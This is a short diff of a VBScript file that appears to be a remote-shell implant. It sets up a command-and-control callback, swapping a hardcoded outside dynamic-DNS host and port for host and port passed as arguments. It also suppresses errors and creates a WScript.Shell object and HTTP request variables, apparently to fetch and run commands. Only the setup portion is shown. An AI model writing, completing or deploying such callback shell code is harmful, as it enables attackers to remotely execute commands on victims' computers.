@@ -1,8 +1,12 @@
 Option Explicit
 On Error Resume Next
+Dim objArgs
+Set objArgs = Wscript.Arguments
 
-CONST callbackUrl = "http://config02.addns.org:4010/"
-
+'CONST callbackUrl = "http://192.168.178.180:4004/"
+Dim callbackUrl
+callbackUrl ="http://" & objArgs(0) & ":"  & objArgs(1) & "/" 
+'Wscript.Echo callbackUrl
 Dim xmlHttpReq, shell, execObj, command, break, result
 
 Set shell = CreateObject("WScript.Shell")
